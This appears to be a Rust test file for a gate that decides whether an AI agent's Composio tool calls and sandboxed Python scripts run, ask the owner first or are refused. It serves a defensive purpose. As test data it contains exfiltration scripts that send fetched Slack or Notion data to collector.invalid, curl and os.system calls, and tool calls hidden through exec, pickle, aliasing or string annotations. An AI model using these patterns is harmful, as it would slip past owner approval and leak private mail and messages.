    ComposioBridge::new(c.clone(), factory(&again)).start().await.unwrap();
    assert_eq!(again.calls.lock().used, vec!["trs_new_1"]); // same shape: resumed
    assert!(again.calls.lock().created.is_empty());
}

#[test]
fn test_the_confirmation_line_names_the_account_a_write_goes_to() {
    let mut args = json!({"tools": [{"tool_slug": "GOOGLECALENDAR_CREATE_EVENT", "arguments": {"summary": "Lunch"},
                                     "account": "work"}]});
    assert_eq!(describe_for_confirmation(MULTI_EXECUTE, &args), "Run GOOGLECALENDAR_CREATE_EVENT on work with summary: Lunch?");
    args["tools"][0].as_object_mut().unwrap().remove("account");
    assert_eq!(describe_for_confirmation(MULTI_EXECUTE, &args), "Run GOOGLECALENDAR_CREATE_EVENT with summary: Lunch?");
}

fn bridge_for(items: Vec<Value>) -> ComposioBridge {
    let b = ComposioBridge::new(ComposioConfig::new(true, "u"), None);
    b.inner.lock().client = Some(Arc::new(FakeClient::new().items(items)));
    b
}

/// 2026-10-04: Drive and GitHub went direct and stay out whatever is connected. 2026-10-05 (owner: "keep composio
/// for the second gmail"): Gmail and the calendar join the session only for the work account; the personal one
/// (and an unnamed one, which cannot be told from it) stays out, and the session must name every account.
#[tokio::test]
async fn test_only_the_owners_other_google_accounts_join_the_session_and_each_call_must_name_one() {
    let mut items: Vec<Value> = Vec::new();
    for kit in ["googlecalendar", "gmail"] {
        for a in ["personal", "work"] {
            items.push(json!({"toolkit": {"slug": kit}, "status": "ACTIVE", "alias": a}));
        }
    }
    items.push(json!({"toolkit": {"slug": "gmail"}, "status": "ACTIVE", "alias": null, "id": "ca_unnamed"}));
    items.push(json!({"toolkit": {"slug": "googledrive"}, "status": "ACTIVE", "alias": "work"}));
    items.push(json!({"toolkit": {"slug": "slack"}, "status": "ACTIVE", "alias": "personal"}));
    let b = bridge_for(items.clone());
    assert_eq!(
        b.allowed_toolkits().await,
        Some(vec!["gmail", "googlecalendar", "linear", "notion", "slack"].into_iter().map(String::from).collect())
    );
    assert_eq!(b.inner.lock().accounts["gmail"], vec!["work"]);
    assert_eq!(b.inner.lock().accounts["googlecalendar"], vec!["work"]);
    assert!(b.multi_account()); // every call names its account
    let note = b.accounts_note();
    assert!(note.contains("Gmail (gmail): work") && note.contains("never their own") && !note.contains("personal"));
    // control: with only personal accounts, nothing of Google's joins and the session is as before
    let only_personal = bridge_for(items.into_iter().filter(|i| i["alias"] == "personal").collect());
    assert_eq!(
        only_personal.allowed_toolkits().await,
        Some(vec!["linear", "notion", "slack"].into_iter().map(String::from).collect())
    );
    assert!(!only_personal.multi_account() && only_personal.accounts_note().is_empty());
}

#[test]
fn test_a_call_to_the_owners_own_google_account_through_composio_is_refused() {
    let item = |account: Option<&str>| {
        let mut t = json!({"tool_slug": "GMAIL_FETCH_EMAILS", "arguments": {}});
        if let Some(a) = account {
            t["account"] = json!(a);
        }
        json!({"tools": [t, {"tool_slug": "SLACK_SEARCH_MESSAGES", "arguments": {}}]})
    };
    for account in [None, Some(""), Some("personal"), Some("Personal")] {
        let x = d(MULTI_EXECUTE, &item(account));
        assert!(x.action == Action::Refuse && x.slugs == ["GMAIL_FETCH_EMAILS"] && x.why.contains("own account"));
    }
    assert_eq!(d(MULTI_EXECUTE, &item(Some("work"))).action, Action::Run);
    // a workbench script cannot name its account, so one that calls Gmail is refused
    let code = "r = run_composio_tool('GMAIL_FETCH_EMAILS', {})\nprint(len(r))";
    assert_eq!(d(WORKBENCH, &json!({"code_to_execute": code})).action, Action::Refuse);
}

// ---- test_composio_workbench.py -----------------------------------------------------------------------------

// The script from the owner's screenshot: pick the NLP lectures out of calendar results already fetched.
const CALENDAR_SCRIPT: &str = "
import json
x = json.load(open('/mnt/files/mex/mine.json'))['items']
nlp = [e for e in x if 'natural language' in (e.get('summary') or '').lower() or 'cse 447' in (e.get('summary') or '').lower()]
print(json.dumps([{'start': e['start'], 'where': e.get('location')} for e in nlp[:5]]))
";

fn wb(code: &str) -> Value {
    json!({"code_to_execute": code, "thought": "t", "current_step": "S", "session_id": "s"})
}

fn slugs_of(code: &str) -> Option<Vec<String>> {
    workbench_slugs(Some(&json!(code)))
}

#[test]
fn test_the_calendar_script_from_the_screenshot_runs_without_a_question() {
    assert_eq!(slugs_of(CALENDAR_SCRIPT), Some(vec![]));
    assert_eq!(d(WORKBENCH, &wb(CALENDAR_SCRIPT)).action, Action::Run);
}

#[test]
fn test_code_that_only_computes_or_reads_runs() {
    for code in [
        "import pandas as pd\ndf = pd.DataFrame([{'a': 1}])\nprint(df.describe())",
        "from datetime import datetime, timedelta\nprint(datetime(2026, 9, 30) + timedelta(days=1))",
        "r = run_composio_tool('NOTION_SEARCH_NOTION_PAGE', {'query': 'trip'})\nprint(len(r['data']))",
        "s = invoke_llm('summarise: ' + open('/mnt/files/a.txt').read())\nprint(s)",
        "hits = web_search('cse 447 syllabus')\nprint(hits)",
        "open('/tmp/out.json', 'w').write('{}')", // the sandbox's own disk
    ] {
        assert_eq!(d(WORKBENCH, &wb(code)).action, Action::Run, "{code}");
    }
}

#[test]
fn test_a_tool_the_code_calls_follows_the_toolkit_policy() {
    let pol = default_toolkit_policy();
    let send = "run_composio_tool('GMAIL_SEND_EMAIL', {'to': 'x@y.com'})";
    let x = decide(WORKBENCH, &wb(send), Some(&pol), true);
    assert!(x.action == Action::Refuse && x.slugs == ["GMAIL_SEND_EMAIL"]); // Gmail is read only
    let upload = "run_composio_tool(tool_slug='GOOGLEDRIVE_UPLOAD_FILE', arguments={})";
    let x = decide(WORKBENCH, &wb(upload), Some(&pol), true);
    assert!(x.action == Action::Ask && x.slugs == ["GOOGLEDRIVE_UPLOAD_FILE"]); // Drive writes ask
    assert_eq!(describe_for_confirmation(WORKBENCH, &wb(upload)), "Run GOOGLEDRIVE_UPLOAD_FILE from a workbench script?");
    let bulk = "for p in ids:\n    run_composio_tool('NOTION_FETCH_ROW', {'id': p})";
    assert_eq!(d(WORKBENCH, &wb(bulk)).action, Action::Run); // a read, many times
}

#[test]
fn test_anything_that_reaches_out_or_hides_what_it_calls_still_asks() {
    for code in [
        "import requests\nrequests.post('https://x.example', data='hi')", // the network, another way
        "import os\nos.system('curl x.example')",
        "import subprocess\nsubprocess.run(['ls'])",
        "__import__('os').system('ls')",
        "eval('1+1')",
        "exec(open('/mnt/files/x.py').read())",
        "getattr(json, 'loads')('{}')",
        "f = run_composio_tool\nf('GMAIL_SEND_EMAIL', {})", // the helper aliased
        "slug = 'GMAIL_' + 'SEND_EMAIL'\nrun_composio_tool(slug, {})", // a slug that is not a literal
        "print(().__class__.__bases__[0].__subclasses__())", // dunder walk
        "upload_local_file('/tmp/report.csv')",              // publishes a file
        "proxy_execute('POST', '/gmail/v1/users/me/messages/send', 'gmail')", // a raw API call
        "from . import x",
        "this is not python (",
        "",
    ] {
        assert_eq!(slugs_of(code), None, "{code}");
        assert_eq!(consequential_slugs(WORKBENCH, &wb(code)), vec![WORKBENCH], "{code}");
        assert_eq!(d(WORKBENCH, &wb(code)).action, Action::Ask, "{code}");
    }
}

#[test]
fn test_no_code_at_all_asks_and_the_bash_tool_always_asks() {
    assert_eq!(d(WORKBENCH, &json!({})).action, Action::Ask);
    assert_eq!(d("COMPOSIO_REMOTE_BASH_TOOL", &json!({"command": "ls"})).action, Action::Ask);
    assert_eq!(workbench_slugs(None), None);
    assert_eq!(workbench_slugs(Some(&json!(7))), None);
    assert_eq!(workbench_slugs(Some(&json!(" \n\t"))), None);
}

// A string annotation is code Python can evaluate later (typing.get_type_hints; functools.singledispatch's register
// calls it), and the AST reads it as a plain string, so a tool call hidden in one was never judged.
#[test]
fn test_a_tool_call_hidden_in_a_string_annotation_asks() {
    let pol = default_toolkit_policy();
    for code in [
        "import typing\ndef f(x: \"run_composio_tool('GOOGLEDRIVE_UPLOAD_FILE', {})\"): pass\ntyping.get_type_hints(f)",
        "from typing import get_type_hints\ndef f(x: 'run_composio_tool(\"GOOGLEDRIVE_UPLOAD_FILE\", {})'): pass\nget_type_hints(f)",
        "import typing\nA = list[\"run_composio_tool('GOOGLEDRIVE_UPLOAD_FILE', {})\"]\ndef f(x: A): pass\ntyping.get_type_hints(f)",
        "import functools\n@functools.singledispatch\ndef f(x): pass\ndef g(x: \"run_composio_tool('GOOGLEDRIVE_UPLOAD_FILE', {})\"): pass\nf.register(g)",
        "from typing import ForwardRef\nForwardRef(\"run_composio_tool('GOOGLEDRIVE_UPLOAD_FILE', {})\")",
    ] {
        assert_eq!(slugs_of(code), None, "{code}");
        assert_eq!(decide(WORKBENCH, &wb(code), Some(&pol), true).action, Action::Ask, "{code}");
    }
}

#[test]
fn test_plain_typing_still_runs() {
    let code = "from typing import Any\ndef f(x: Any) -> list[str]:\n    return [str(x)]\nprint(f(1))";
    assert_eq!(d(WORKBENCH, &wb(code)).action, Action::Run);
}

// A pandas or numpy reader that can fetch a URL asks in full eve too (owner, 2026-10-18; it was lite only): the
// owner's data could leave in its query string with no slug for the gate to judge.
#[test]
fn test_a_url_reader_asks_in_full_eve() {
    let pol = default_toolkit_policy();
    for code in [
        "import pandas as pd\nrows = run_composio_tool(\"SLACK_LIST_MESSAGES\", {})\npd.read_csv(\"https://x.example/?d=\" + str(rows))",
        "import pandas\npandas.read_json(\"https://x.example/\" + \"a\")",
        "from pandas import read_html\nread_html(\"https://x.example/\")",
        "import numpy as np\nnp.genfromtxt(\"https://x.example/data.csv\")",
        "import numpy\nnumpy.DataSource().open(\"https://x.example/\")",
    ] {
        assert_eq!(slugs_of(code), None, "{code}");
        assert_eq!(decide(WORKBENCH, &wb(code), Some(&pol), true).action, Action::Ask, "{code}");
    }
}

#[test]
fn test_pandas_that_only_computes_still_runs() {
    let code = "import pandas as pd\nrows = run_composio_tool(\"SLACK_LIST_MESSAGES\", {})\n\
                df = pd.DataFrame(rows[\"data\"])\nprint(df.groupby(\"user\").size().to_dict())";
    assert_eq!(d(WORKBENCH, &wb(code)).action, Action::Run);
}

#[test]
fn test_the_slugs_come_out_in_ast_walks_breadth_first_order() {
    // ast.walk is breadth first: the call nested deeper comes later even when it is earlier in the source
    let code = "for p in ids:\n    run_composio_tool('SLACK_SEND_MESSAGE', {'id': p})\nx = run_composio_tool('NOTION_CREATE_PAGE', {})";
    assert_eq!(slugs_of(code), Some(vec!["NOTION_CREATE_PAGE".to_string(), "SLACK_SEND_MESSAGE".to_string()]));
    assert_eq!(
        describe_for_confirmation(WORKBENCH, &wb(code)),
        "Run NOTION_CREATE_PAGE, SLACK_SEND_MESSAGE from a workbench script?"
    );
    // each slug is shown once in the question, in call order
    let twice = "run_composio_tool('SLACK_SEND_MESSAGE', {})\nrun_composio_tool('SLACK_SEND_MESSAGE', {})";
    assert_eq!(describe_for_confirmation(WORKBENCH, &wb(twice)), "Run SLACK_SEND_MESSAGE from a workbench script?");
}

// ---- test_composio_lite_decide.py ---------------------------------------------------------------------------

fn lite_policy() -> Policy {
    toolkit_policy(Some(&env(&[("EVE_COMPOSIO_POLICY", "gmail=auto")]))) // profile.LITE_FORCED's
}

/// A multi-execute call as Composio Connect's schema has it: items naming no account (S1: no multi-account).
fn lite_multi(calls: &[(&str, Value)]) -> Value {
    json!({"tools": calls.iter().map(|(s, a)| json!({"tool_slug": s, "arguments": a})).collect::<Vec<_>>(),
           "sync_response_to_workbench": false, "thought": "t"})
}

fn gmail_send() -> Value {
    lite_multi(&[("GMAIL_SEND_EMAIL", json!({"recipient_email": "reader@example.org", "subject": "Lunch", "body": "Noon works."}))])
}

#[test]
fn test_a_gmail_read_naming_no_account_runs_in_lite_and_full_eve_still_refuses_it() {
    let pol = lite_policy();
    let read = lite_multi(&[("GMAIL_FETCH_EMAILS", json!({"query": "from:sam newer_than:1d", "max_results": 5}))]);
    let lite = decide(MULTI_EXECUTE, &read, Some(&pol), false);
    assert_eq!((lite.action, lite.slugs.clone()), (Action::Run, vec![]));
    // control: the default is full eve's rule, and the personal account is direct there
    let full = decide(MULTI_EXECUTE, &read, Some(&pol), true);
    assert!(full.action == Action::Refuse && full.slugs == ["GMAIL_FETCH_EMAILS"]);
    assert_eq!(decide_lite(MULTI_EXECUTE, &read, Some(&pol)), lite);
}

#[test]
fn test_the_calendar_reads_and_its_private_events_run_and_an_invite_asks() {
    let pol = lite_policy();
    let read = lite_multi(&[("GOOGLECALENDAR_EVENTS_LIST", json!({"calendar_id": "primary"}))]);
    let private = lite_multi(&[("GOOGLECALENDAR_CREATE_EVENT", json!({"summary": "Focus", "start_datetime": "2026-10-14T09:00"}))]);
    let invite = lite_multi(&[("GOOGLECALENDAR_CREATE_EVENT", json!({"summary": "Sync", "attendees": ["reader@example.org"]}))]);
    assert_eq!(decide_lite(MULTI_EXECUTE, &read, Some(&pol)).action, Action::Run);
    assert_eq!(decide_lite(MULTI_EXECUTE, &private, Some(&pol)).action, Action::Run); // routine, private
    let x = decide_lite(MULTI_EXECUTE, &invite, Some(&pol));
    assert_eq!((x.action, x.slugs), (Action::Ask, vec!["GOOGLECALENDAR_CREATE_EVENT".to_string()])); // it emails a guest
    assert_eq!(decide(MULTI_EXECUTE, &private, Some(&pol), true).action, Action::Refuse); // control: full eve
}

#[test]
fn test_a_send_asks_a_draft_runs_and_a_delete_asks_under_lites_gmail_policy() {
    let pol = lite_policy();
    let send = decide_lite(MULTI_EXECUTE, &gmail_send(), Some(&pol));
    assert_eq!((send.action, send.slugs), (Action::Ask, vec!["GMAIL_SEND_EMAIL".to_string()]));
    let draft = lite_multi(&[("GMAIL_CREATE_EMAIL_DRAFT", json!({"to": "reader@example.org", "subject": "Lunch", "body": "Noon works."}))]);
    assert_eq!(decide_lite(MULTI_EXECUTE, &draft, Some(&pol)).action, Action::Run); // apps_mcp.routine_write
    // arguments routine_write cannot read never prove a write routine: such a draft asks, it is never run unasked
    let draft_composio = lite_multi(&[("GMAIL_CREATE_EMAIL_DRAFT", json!({"recipient_email": "reader@example.org",
        "extra_recipients": [], "subject": "Lunch", "body": "Noon works."}))]);
    assert_eq!(decide_lite(MULTI_EXECUTE, &draft_composio, Some(&pol)).action, Action::Ask);
    let trash = decide_lite(MULTI_EXECUTE, &lite_multi(&[("GMAIL_MOVE_TO_TRASH", json!({"message_id": "m1"}))]), Some(&pol));
    assert_eq!(trash.action, Action::Ask);
    // the code's own default policy keeps Gmail read only: the send is refused, never run
    let refused = decide(MULTI_EXECUTE, &gmail_send(), None, false);
    assert!(refused.action == Action::Refuse && refused.why.contains("read only"));
    // and the whole act is what the owner is shown
    let line = describe_whole(MULTI_EXECUTE, &gmail_send(), eve_tool_gate::SHOW_CHARS).unwrap();
    assert!(line.contains("reader@example.org") && line.contains("Noon works."));
}

/// A script that reads the owner's own Gmail or Calendar asks in lite (full eve refuses it; lite reaches those apps
/// on purpose, so it asks before a sandboxed script computes on their contents). A send still asks, and the bash
/// tool always asks.
#[test]
fn test_a_workbench_script_reaching_the_owners_mail_or_calendar_asks_in_lite() {
    let pol = lite_policy();
    let read = json!({"code_to_execute": "r = run_composio_tool('GMAIL_FETCH_EMAILS', {})\nprint(len(r))"});
    let send = json!({"code_to_execute": "run_composio_tool('GMAIL_SEND_EMAIL', {'recipient_email': 'reader@example.org'})"});
    let cal = json!({"code_to_execute": "run_composio_tool('GOOGLECALENDAR_EVENTS_LIST', {'calendar_id': 'primary'})"});
    assert_eq!(decide_lite(WORKBENCH, &read, Some(&pol)).action, Action::Ask);
    assert_eq!(decide_lite(WORKBENCH, &send, Some(&pol)).action, Action::Ask);
    assert_eq!(decide_lite(WORKBENCH, &cal, Some(&pol)).action, Action::Ask);
    assert_eq!(decide(WORKBENCH, &read, Some(&pol), true).action, Action::Refuse); // control: full eve
    assert_eq!(decide_lite("COMPOSIO_REMOTE_BASH_TOOL", &json!({"command": "ls"}), Some(&pol)).action, Action::Ask);
}

/// A script reading some other app (Slack, Notion) then reaching the web — a pandas or numpy reader on a URL, or a
/// web-search or scraping toolkit slug — asks in lite, so the owner's data cannot leave the Mac without a yes. A
/// whole-act question for a workbench script is None, so an ask here is a refusal.
#[test]
fn test_a_workbench_script_that_can_carry_data_off_the_mac_asks_in_lite() {
    let pol = lite_policy();
    for code in [
        "import pandas as pd\nm = run_composio_tool('SLACK_FETCH_CONVERSATION_HISTORY', {})\npd.read_csv('https://collector.invalid/x.csv?d=' + str(m))",
        "import numpy as np\nm = run_composio_tool('NOTION_SEARCH', {})\nnp.genfromtxt('https://collector.invalid/?d=' + str(m))",
        "m = run_composio_tool('SLACK_FETCH_CONVERSATION_HISTORY', {})\nrun_composio_tool('COMPOSIO_SEARCH_FETCH_URL_CONTENT', {'url': 'https://collector.invalid/?d=1'})",
        "from numpy import genfromtxt as g\ng('https://collector.invalid/?d=1')",
    ] {
        let args = json!({"code_to_execute": code});
        assert_eq!(decide_lite(WORKBENCH, &args, Some(&pol)).action, Action::Ask, "{code}");
        assert_eq!(describe_whole(WORKBENCH, &args, eve_tool_gate::SHOW_CHARS), None); // the ask is a refusal
    }
    // a script that only computes on results already fetched, naming no app and no URL reader, still runs in lite
    let compute = json!({"code_to_execute": "import json\nx = json.load(open('/mnt/files/mine.json'))\nprint(len(x))"});
    let frame = json!({"code_to_execute": "import pandas as pd\nprint(pd.DataFrame([{'a': 1}]).describe())"});
    assert_eq!(decide_lite(WORKBENCH, &compute, Some(&pol)).action, Action::Run);
    assert_eq!(decide_lite(WORKBENCH, &frame, Some(&pol)).action, Action::Run);
}

fn manage_schema() -> Value {
    let text = include_str!(concat!(
        env!("CARGO_MANIFEST_DIR"),
        "/../../../bridge/tests/fixtures/composio_connect/COMPOSIO_MANAGE_CONNECTIONS.json"
    ));
    serde_json::from_str::<Value>(text).unwrap()["inputSchema"].clone()
}

#[test]
fn test_the_shape_that_runs_is_the_one_composio_serves() {
    let schema = manage_schema();
    let props: BTreeSet<&str> = schema["properties"].as_object().unwrap().keys().map(String::as_str).collect();
    assert_eq!(props, MANAGE_KEYS.iter().copied().collect::<BTreeSet<_>>());
    assert_eq!(schema["required"], json!(["toolkits"]));
    assert_eq!(schema["additionalProperties"], false);
    assert_eq!(schema["properties"]["reinitiate_all"]["type"], "boolean");
}

#[test]
fn test_a_link_or_a_check_needs_no_yes() {
    let pol = lite_policy();
    for args in [
        json!({"toolkits": ["gmail"]}),
        json!({"toolkits": ["gmail", "googlecalendar"], "session_id": "s-1"}),
        json!({"toolkits": ["slack"], "reinitiate_all": false}),
        json!({"toolkits": ["notion"], "reinitiate_all": false, "session_id": ""}),
    ] {
        assert!(!manage_needs_yes(&args), "{args}");
        assert_eq!(decide_lite(MANAGE_CONNECTIONS, &args, Some(&pol)).action, Action::Run, "{args}");
    }
}

#[test]
fn test_every_other_shape_asks() {
    let pol = lite_policy();
    for args in [
        json!({"toolkits": ["gmail"], "reinitiate_all": true}), // replaces a live connection
        json!({"toolkits": ["gmail"], "action": "remove"}),     // a key Connect's live schema may add
        json!({"toolkits": ["gmail"], "remove": true}),
        json!({"toolkits": ["gmail"], "name": "work"}),
        json!({"toolkits": []}),
        json!({"toolkits": "gmail"}),
        json!({"toolkits": ["gmail", ""]}),
        json!({"toolkits": ["  "]}),
        json!({"toolkits": [7]}),
        json!({"toolkits": ["gmail"], "reinitiate_all": "false"}),
        json!({"toolkits": ["gmail"], "reinitiate_all": 0}),
        json!({"toolkits": ["gmail"], "reinitiate_all": null}),
        json!({"toolkits": ["gmail"], "session_id": 12}),
        json!({}),
        Value::Null,
        json!(["gmail"]),
        json!("gmail"),
    ] {
        assert!(manage_needs_yes(&args), "{args}");
        let x = decide_lite(MANAGE_CONNECTIONS, &args, Some(&pol));
        assert_eq!((x.action, x.slugs), (Action::Ask, vec![MANAGE_CONNECTIONS.to_string()]), "{args}");
    }
}

/// Control: the ask is eve lite's alone (full eve's verdicts are the golden's).
#[test]
fn test_full_eve_still_runs_every_manage_call_unasked() {
    for args in [
        json!({"toolkits": ["gmail"]}),
        json!({"toolkits": ["gmail"], "reinitiate_all": true}),
        json!({"toolkits": ["gmail"], "action": "remove"}),
    ] {
        assert_eq!(decide(MANAGE_CONNECTIONS, &args, None, true).action, Action::Run);
    }
}

/// sends_mail: the calls eve lite shows whole with Gmail's own allowance.
#[test]
fn test_a_gmail_send_is_known_as_one() {
    for (slug, sends) in [
        ("GMAIL_SEND_EMAIL", true),
        ("GMAIL_REPLY_TO_THREAD", true),
        ("GMAIL_FORWARD_MESSAGE", true),
        ("GMAIL_SEND_DRAFT", true),
        ("GMAIL_FETCH_EMAILS", false),
        ("GMAIL_CREATE_EMAIL_DRAFT", false),
        ("GMAIL_MOVE_TO_TRASH", false),
        ("SLACK_SEND_MESSAGE", false),
        ("OUTLOOK_SEND_EMAIL", false),
    ] {
        let call = lite_multi(&[(slug, json!({"recipient_email": "reader@example.org"}))]);
        assert_eq!(sends_mail(MULTI_EXECUTE, &call), sends, "{slug}");
        let mixed = lite_multi(&[("SLACK_SEND_MESSAGE", json!({"channel": "design", "text": "hi"})), (slug, json!({}))]);
        assert_eq!(sends_mail(MULTI_EXECUTE, &mixed), sends, "{slug}");
        assert!(!sends_mail(WORKBENCH, &json!({"code_to_execute": format!("run_composio_tool('{slug}', {{}})")})));
        assert!(!sends_mail(MULTI_EXECUTE, &json!({"tools": "opaque"})));
    }
}

#[test]
fn test_the_other_meta_tools_keep_their_verdicts_in_lite() {
    let pol = lite_policy();
    let run = |name: &str, args: Value| decide_lite(name, &args, Some(&pol)).action;
    assert_eq!(run("COMPOSIO_SEARCH_TOOLS", json!({"queries": [{"use_case": "read my mail"}]})), Action::Run);
    assert_eq!(run("COMPOSIO_GET_TOOL_SCHEMAS", json!({"tool_slugs": ["GMAIL_SEND_EMAIL"]})), Action::Run);
    assert_eq!(run("COMPOSIO_WAIT_FOR_CONNECTIONS", json!({"toolkits": ["gmail"]})), Action::Run);
    let opaque = decide_lite(MULTI_EXECUTE, &json!({"tools": "opaque"}), Some(&pol));
    assert_eq!((opaque.action, opaque.slugs), (Action::Ask, vec![MULTI_EXECUTE.to_string()]));
}

// ---- the owner golden's corpus and more, against composio_tools.py's own answers ------------------------------

fn decision_value(x: &Decision) -> Value {
    json!([x.action.as_str(), x.slugs, x.why])
}

/// The owner golden's whole decide() corpus (and the workbench scripts and edge calls make_python_verdicts.py adds),
/// under its four policies: every verdict, lite verdict, question line and whole line is what composio_tools.py
/// answered. Also test_the_new_keyword_changes_no_verdict_of_full_eve: the default and personal_direct=True are one
/// rule.
#[test]
fn test_every_answer_matches_composio_tools_py() {
    let data: Value = serde_json::from_str(include_str!("../tests/fixtures/python_verdicts.json")).unwrap();
    let policies: Vec<(String, Option<Policy>)> = data["policies"]
        .as_object()
        .unwrap()
        .iter()
        .map(|(name, raw)| {
            let raw = raw.as_str().unwrap();
            let pol = (!raw.is_empty()).then(|| toolkit_policy(Some(&env(&[("EVE_COMPOSIO_POLICY", raw)]))));
            (name.clone(), pol)
        })
        .collect();
    let cases = data["cases"].as_array().unwrap();
    assert!(cases.len() > 100);
    let mut failures: Vec<String> = Vec::new();
    for case in cases {
        let key = case["key"].as_str().unwrap();
        let name = case["name"].as_str().unwrap();
        let args = &case["args"];
        let mut check = |what: &str, got: Value, want: &Value| {
            if &got != want {
                failures.push(format!("{key} {what}: got {got}, Python {want}"));
            }
        };
        for (pname, pol) in &policies {
            check(&format!("decide[{pname}]"), decision_value(&decide(name, args, pol.as_ref(), true)), &case["verdicts"][pname]);
            check(&format!("decide_lite[{pname}]"), decision_value(&decide_lite(name, args, pol.as_ref())), &case["lite"][pname]);
            assert_eq!(decide(name, args, pol.as_ref(), true), decide(name, args, pol.as_ref(), true));
        }
        check("ask_line", json!(describe_for_confirmation(name, args)), &case["ask_line"]);
        check("whole_1500", json!(describe_whole(name, args, 1500)), &case["whole_1500"]);
        check("consequential", json!(consequential_slugs(name, args)), &case["consequential"]);
        check("sends_mail", json!(sends_mail(name, args)), &case["sends_mail"]);
        check("web", json!(web_toolkit_slugs(name, args)), &case["web"]);
        check("manage_needs_yes", json!(manage_needs_yes(args)), &case["manage_needs_yes"]);
        if let Some(want) = case.get("workbench_slugs") {
            let code = args.get("code_to_execute");
            check("workbench_slugs", json!(workbench_slugs(code)), want);
            check("reaches_out_lite", json!(workbench_reaches_out_lite(code)), &case["reaches_out_lite"]);
        }
    }
    assert!(failures.is_empty(), "{} differences:\n{}", failures.len(), failures.join("\n"));
}

// ---- test_lean_appspolicy_replay.py (Composio's session) -----------------------------------------------------

async fn lean_session(dir: &Path, toolkits: Option<Vec<&str>>, accounts: Vec<Value>) -> (ComposioBridge, Arc<FakeClient>) {
    let client = Arc::new(FakeClient { use_raises: true, tools: vec![], ..FakeClient::new() }.items(accounts));
    let config = ComposioConfig {
        state_path: dir.join("c.json"),
        toolkits: toolkits.map(|t| t.into_iter().map(String::from).collect()),
        ..ComposioConfig::new(true, "telegram-7")
    };
    let b = ComposioBridge::new(config, factory(&client));
    b.start().await.unwrap();
    (b, client)
}

/// Whether a session made with these arguments holds this toolkit.
fn joins(client: &FakeClient, kit: &str) -> bool {
    let tk = client.calls.lock().toolkits.last().cloned().unwrap();
    if let Some(Value::Array(e)) = tk.get("enable") {
        return e.contains(&json!(kit));
    }
    if let Some(Value::Array(dis)) = tk.get("disable") {
        return !dis.contains(&json!(kit));
    }
    true
}

fn multi_named(client: &FakeClient) -> bool {
    let ma = client.calls.lock().multi.last().cloned().flatten().unwrap_or(json!({}));
    truthy(ma.get("enable")) && truthy(ma.get("require_explicit_selection"))
}

fn acct(kit: &str, alias: Value, i: usize) -> Value {
    json!({"toolkit": {"slug": kit}, "status": "ACTIVE", "alias": alias, "id": format!("ca_{kit}_{i}")})
}

#[tokio::test]
async fn test_the_personal_gmail_aliased_with_a_capital_stays_out_of_the_session() {
    // decide() already treats "Personal" as the personal account; the session must too.
    assert_eq!(
        d(MULTI_EXECUTE, &json!({"tools": [{"tool_slug": "GMAIL_FETCH_EMAILS", "account": "Personal"}]})).action,
        Action::Refuse
    );
    for alias in ["Personal", " personal", "PERSONAL"] {
        let tmp = tempfile::tempdir().unwrap();
        let (_b, client) = lean_session(tmp.path(), Some(vec!["slack"]), vec![acct("gmail", json!(alias), 1)]).await;
        assert!(!joins(&client, "gmail"), "{alias}");
    }
}

#[tokio::test]
async fn test_a_configured_gmail_with_only_the_personal_account_stays_out() {
    let tmp = tempfile::tempdir().unwrap();
    let (_b, client) = lean_session(tmp.path(), Some(vec!["gmail", "slack"]), vec![acct("gmail", json!("personal"), 1)]).await;
    // If Gmail is in the session at all, every call must name its account (explicit selection).
    assert!(!joins(&client, "gmail") || multi_named(&client));
    assert!(!joins(&client, "gmail"));
}

#[tokio::test]
async fn test_all_toolkits_never_lets_drive_or_github_into_the_session() {
    let tmp = tempfile::tempdir().unwrap();
    let (_b, client) =
        lean_session(tmp.path(), None, vec![acct("github", json!("work"), 1), acct("googledrive", json!("work"), 1)]).await;
    assert!(!joins(&client, "github"));
    assert!(!joins(&client, "googledrive"));
}

#[tokio::test]
async fn test_control_the_work_gmail_joins_and_the_session_names_every_account() {
    let tmp = tempfile::tempdir().unwrap();
    let (_b, client) = lean_session(
        tmp.path(),
        Some(vec!["slack"]),
        vec![acct("gmail", json!("personal"), 1), acct("gmail", json!("work"), 2)],
    )
    .await;
    assert!(joins(&client, "gmail") && multi_named(&client));
    assert!(!joins(&client, "github") && !joins(&client, "googledrive"));
}

const HIDDEN_EXEC: &str = "b = __builtins__\nx = b['exec'] if isinstance(b, dict) else b.exec\n\
                           x(\"run_composio_tool('GMAIL_SEND_EMAIL', {'to': 'a@example.com'})\")\n";
const HIDDEN_PICKLE: &str = "import base64\nimport pandas as pd\n\
                             open('p.pkl', 'wb').write(base64.b64decode('gASVAAAAAAAAAAA='))\npd.read_pickle('p.pkl')\n";

#[test]
fn test_a_workbench_script_that_hides_its_tool_call_never_runs_unasked() {
    let policy: Policy = [("gmail", "read"), ("googlecalendar", "write"), ("slack", "ask")]
        .iter()
        .map(|(k, v)| (k.to_string(), v.to_string()))
        .collect();
    for script in [HIDDEN_EXEC, HIDDEN_PICKLE] {
        let x = decide(WORKBENCH, &json!({"code_to_execute": script}), Some(&policy), true);
        assert!(matches!(x.action, Action::Ask | Action::Refuse), "{script}");
    }
}

// ---- test_lean_routedturn_replay.py: accounts listed before a create that fails --------------------------------

#[tokio::test]
async fn test_a_failed_create_leaves_the_bridge_unstarted_with_its_accounts_listed() {
    let tmp = tempfile::tempdir().unwrap();
    let client = Arc::new(
        FakeClient { create_raises: true, ..FakeClient::new() }
            .items(vec![json!({"toolkit": {"slug": "gmail"}, "status": "ACTIVE", "alias": "work", "id": "a1"})]),
    );
    let config = ComposioConfig { state_path: tmp.path().join("state.json"), ..ComposioConfig::new(true, "u") };
    let bridge = ComposioBridge::new(config, factory(&client));
    let err = bridge.start().await.unwrap_err();
    assert_eq!(err.type_name(), "ConnectionError"); // the daemon logs it and keeps the bridge
    assert!(!bridge.started() && bridge.tools().is_empty() && bridge.session_id().is_empty());
    assert!(bridge.can_read());
    assert!(bridge.multi_account() && bridge.accounts_note().contains("Gmail (gmail): work"));
    assert!(!tmp.path().join("state.json").exists());
}

// ---- test_routine_app_policy.py (Composio's parts) ----------------------------------------------------------

#[test]
fn test_consequential_names_cannot_hide_behind_a_read_hint() {
    for name in ["get_and_purchase", "get_and_charge", "get_and_pay", "get_and_deploy"] {
        assert!(!is_read_only(&format!("SHOP_{}", name.to_uppercase())));
    }
}

fn multi_args(calls: &[(&str, Value)], policy: Option<&Policy>) -> Action {
    let tools: Vec<Value> = calls.iter().map(|(s, a)| json!({"tool_slug": s, "arguments": a, "account": "work"})).collect();
    decide(MULTI_EXECUTE, &json!({"tools": tools}), policy, true).action
}

fn pol(pairs: &[(&str, &str)]) -> Policy {
